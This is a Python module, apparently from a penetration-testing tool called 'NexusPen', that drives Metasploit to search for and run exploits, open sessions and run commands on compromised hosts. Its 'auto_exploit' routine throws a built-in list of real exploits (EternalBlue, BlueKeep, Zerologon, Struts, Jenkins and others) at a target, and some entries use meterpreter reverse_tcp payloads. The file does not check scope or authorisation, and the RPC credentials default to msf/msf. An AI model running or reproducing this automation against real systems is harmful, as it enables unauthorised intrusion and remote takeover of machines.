#!/usr/bin/env python3
"""
NexusPen - Exploitation Module
==============================
Metasploit integration and exploit execution.
"""

import subprocess
import re
import time
import socket
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass

from rich.console import Console
from rich.table import Table

console = Console()


@dataclass
class ExploitResult:
    """Result of an exploitation attempt."""
    target: str
    exploit: str
    success: bool
    session_id: Optional[int] = None
    session_type: Optional[str] = None
    output: Optional[str] = None


class MetasploitClient:
    """
    Metasploit Framework integration.
    Uses msfconsole and msfrpcd for exploitation.
    """
    
    def __init__(self, host: str = '127.0.0.1', port: int = 55553,
                 username: str = 'msf', password: str = 'msf'):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.client = None
    
    def connect(self) -> bool:
        """Connect to Metasploit RPC daemon."""
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
            self.client = MsfRpcClient(self.password, server=self.host, port=self.port)
            console.print("[green]âœ“ Connected to Metasploit[/green]")
            return True
        except ImportError:
            console.print("[yellow]pymetasploit3 not installed[/yellow]")
            return False
        except Exception as e:
            console.print(f"[red]Failed to connect to Metasploit: {e}[/red]")
            return False
    
    def search_exploits(self, query: str) -> List[Dict]:
        """Search for exploits in Metasploit."""
        console.print(f"\n[cyan]ðŸ” Searching exploits: {query}[/cyan]")
        
        exploits = []
        
        try:
            if self.client:
                # Use RPC
                modules = self.client.modules.search(query)
                for mod in modules:
                    if mod['type'] == 'exploit':
                        exploits.append({
                            'name': mod['fullname'],
                            'rank': mod.get('rank', 'unknown'),
                            'description': mod.get('description', '')[:100]
                        })
            else:
                # Use msfconsole
                cmd = ['msfconsole', '-q', '-x', f'search type:exploit {query}; exit']
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                
                for line in result.stdout.split('\n'):
                    if 'exploit/' in line:
                        parts = line.split()
                        if len(parts) >= 3:
                            exploits.append({
                                'name': parts[0],
                                'rank': parts[1],
                                'description': ' '.join(parts[2:])[:100]
                            })
                            
        except Exception as e:
            console.print(f"[yellow]Search error: {e}[/yellow]")
        
        return exploits
    
    def run_exploit(self, exploit: str, target: str, port: int,
                   payload: str = None, options: Dict = None) -> ExploitResult:
        """
        Run a Metasploit exploit.
        
        Args:
            exploit: Exploit module path (e.g., exploit/windows/smb/ms17_010_eternalblue)
            target: Target IP address
            port: Target port
            payload: Payload to use (auto-selects if None)
            options: Additional options
        """
        console.print(f"\n[cyan]ðŸŽ¯ Running exploit: {exploit}[/cyan]")
        console.print(f"[cyan]Target: {target}:{port}[/cyan]")
        
        result = ExploitResult(
            target=target,
            exploit=exploit,
            success=False
        )
        
        options = options or {}
        
        try:
            if self.client:
                # Use RPC
                exploit_mod = self.client.modules.use('exploit', exploit)
                
                # Set options
                exploit_mod['RHOSTS'] = target
                exploit_mod['RPORT'] = port
                
                for key, value in options.items():
                    exploit_mod[key] = value
                
                # Select payload
                if payload:
                    exploit_mod.payload = payload
                else:
                    # Auto-select payload
                    payloads = exploit_mod.targetpayloads()
                    if payloads:
                        exploit_mod.payload = payloads[0]
                
                # Set LHOST if needed
                if 'LHOST' not in options:
                    exploit_mod['LHOST'] = self._get_local_ip()
                
                # Execute
                console.print("[yellow]Executing exploit...[/yellow]")
                job_id = exploit_mod.execute()
                
                # Wait for session
                time.sleep(5)
                sessions = self.client.sessions.list
                
                if sessions:
                    session_id = list(sessions.keys())[-1]
                    result.success = True
                    result.session_id = session_id
                    result.session_type = sessions[session_id].get('type')
                    console.print(f"[green]âœ“ Session created: {session_id}[/green]")
                else:
                    console.print("[yellow]No session created[/yellow]")
                    
            else:
                # Use msfconsole
                commands = [
                    f'use {exploit}',
                    f'set RHOSTS {target}',
                    f'set RPORT {port}',
                ]
                
                if payload:
                    commands.append(f'set PAYLOAD {payload}')
                
                for key, value in options.items():
                    commands.append(f'set {key} {value}')
                
                commands.extend(['exploit -z', 'exit'])
                
                cmd = ['msfconsole', '-q', '-x', '; '.join(commands)]
                proc_result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                
                result.output = proc_result.stdout
                
                if 'session' in proc_result.stdout.lower() and 'opened' in proc_result.stdout.lower():
                    result.success = True
                    # Parse session ID
                    match = re.search(r'session (\d+) opened', proc_result.stdout, re.IGNORECASE)
                    if match:
                        result.session_id = int(match.group(1))
                        
        except Exception as e:
            result.output = str(e)
            console.print(f"[red]Exploit error: {e}[/red]")
        
        return result
    
    def run_auxiliary(self, module: str, target: str, 
                     options: Dict = None) -> Dict:
        """Run an auxiliary module."""
        console.print(f"\n[cyan]ðŸ”§ Running auxiliary: {module}[/cyan]")
        
        options = options or {}
        results = {}
        
        try:
            if self.client:
                aux = self.client.modules.use('auxiliary', module)
                aux['RHOSTS'] = target
                
                for key, value in options.items():
                    aux[key] = value
                
                job_id = aux.execute()
                time.sleep(3)
                
                results = {'job_id': job_id, 'status': 'executed'}
            else:
                commands = [f'use {module}', f'set RHOSTS {target}']
                
                for key, value in options.items():
                    commands.append(f'set {key} {value}')
                
                commands.extend(['run', 'exit'])
                
                cmd = ['msfconsole', '-q', '-x', '; '.join(commands)]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
                
                results = {'output': result.stdout}
                
        except Exception as e:
            results = {'error': str(e)}
        
        return results
    
    def get_sessions(self) -> Dict:
        """Get active sessions."""
        if self.client:
            return self.client.sessions.list
        return {}
    
    def interact_session(self, session_id: int, command: str) -> str:
        """Execute command on a session."""
        if self.client and session_id in self.client.sessions.list:
            session = self.client.sessions.session(session_id)
            return session.run_with_output(command)
        return ""
    
    def _get_local_ip(self) -> str:
        """Get local IP address."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"


class ExploitRunner:
    """
    Standalone exploit runner for common vulnerabilities.
    """
    
    # Common exploits mapping
    EXPLOITS = {
        'ms17_010': {
            'name': 'EternalBlue',
            'module': 'exploit/windows/smb/ms17_010_eternalblue',
            'port': 445,
            'payload': 'windows/x64/meterpreter/reverse_tcp'
        },
        'ms08_067': {
            'name': 'NetAPI',
            'module': 'exploit/windows/smb/ms08_067_netapi',
            'port': 445,
            'payload': 'windows/meterpreter/reverse_tcp'
        },
        'zerologon': {
            'name': 'Zerologon',
            'module': 'exploit/windows/dcerpc/cve_2020_1472_zerologon',
            'port': 135,
        },
        'bluekeep': {
            'name': 'BlueKeep',
            'module': 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce',
            'port': 3389,
        },
        'tomcat_mgr': {
            'name': 'Tomcat Manager Deploy',
            'module': 'exploit/multi/http/tomcat_mgr_deploy',
            'port': 8080,
        },
        'apache_struts': {
            'name': 'Apache Struts RCE',
            'module': 'exploit/multi/http/struts2_content_type_ognl',
            'port': 80,
        },
        'jenkins_cli': {
            'name': 'Jenkins CLI RCE',
            'module': 'exploit/multi/http/jenkins_script_console',
            'port': 8080,
        },
    }
    
    def __init__(self, target: str, config: Dict = None):
        self.target = target
        self.config = config or {}
        self.msf = MetasploitClient()
    
    def auto_exploit(self, vulns: List[str]) -> List[ExploitResult]:
        """
        Automatically exploit discovered vulnerabilities.
        
        Args:
            vulns: List of vulnerability identifiers (e.g., ['ms17_010', 'bluekeep'])
        """
        console.print("\n[cyan]ðŸš€ Auto-exploitation mode[/cyan]")
        
        results = []
        
        # Connect to Metasploit
        self.msf.connect()
        
        for vuln in vulns:
            if vuln in self.EXPLOITS:
                exploit_info = self.EXPLOITS[vuln]
                
                console.print(f"\n[yellow]Attempting: {exploit_info['name']}[/yellow]")
                
                result = self.msf.run_exploit(
                    exploit=exploit_info['module'],
                    target=self.target,
                    port=exploit_info['port'],
                    payload=exploit_info.get('payload')
                )
                
                results.append(result)
                
                if result.success:
                    console.print(f"[green]âœ“ {exploit_info['name']} succeeded![/green]")
                else:
                    console.print(f"[yellow]âœ— {exploit_info['name']} failed[/yellow]")
        
        return results
    
    def list_available_exploits(self):
        """Display available exploits."""
        table = Table(title="Available Exploits", header_style="bold magenta")
        table.add_column("ID", style="cyan")
        table.add_column("Name", style="yellow")
        table.add_column("Module", style="dim")
        table.add_column("Port", style="green")
        
        for exploit_id, info in self.EXPLOITS.items():
            table.add_row(
                exploit_id,
                info['name'],
                info['module'],
                str(info['port'])
            )
        
        console.print(table)
